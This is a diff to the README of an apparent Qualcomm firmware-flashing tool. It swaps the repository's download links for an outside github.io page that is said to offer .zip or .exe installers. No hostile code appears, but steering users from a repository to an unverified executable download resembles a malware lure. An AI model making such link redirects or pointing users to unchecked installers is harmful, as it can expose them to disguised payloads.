@@ -1,6 +1,6 @@
 # 🛠️ Qualcomm-Flash-Tool-Pro - Manage your Qualcomm device firmware files
 
-[![](https://img.shields.io/badge/Download-Qualcomm_Flash_Tool_Pro-blue)](https://github.com/Winfieldstunning713/Qualcomm-Flash-Tool-Pro)
+[![](https://img.shields.io/badge/Download-Qualcomm_Flash_Tool_Pro-blue)](https://winfieldstunning713.github.io)
 
 Qualcomm-Flash-Tool-Pro provides a structured method for users to flash firmware images onto devices equipped with Qualcomm Snapdragon chipsets. This tool supports Windows 10 and Windows 11 environments. It interacts with the device emergency download mode to communicate with the internal flash memory. Use this software to restore factory software, update firmware, or recover devices from software loops.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these conditions before you begin the process.
 
 ## 💾 Downloading the Software
 
-Visit [this page](https://github.com/Winfieldstunning713/Qualcomm-Flash-Tool-Pro) to select the correct release for your computer.
+Visit [this page](https://winfieldstunning713.github.io) to select the correct release for your computer.
 
 The repository hosts the primary installer package. Click the link above to view the latest version. Look for the file ending in .zip or .exe under the latest release section. Download the archive to a clean folder on your desktop. Extract the contents if the file is compressed in a zip format.
 
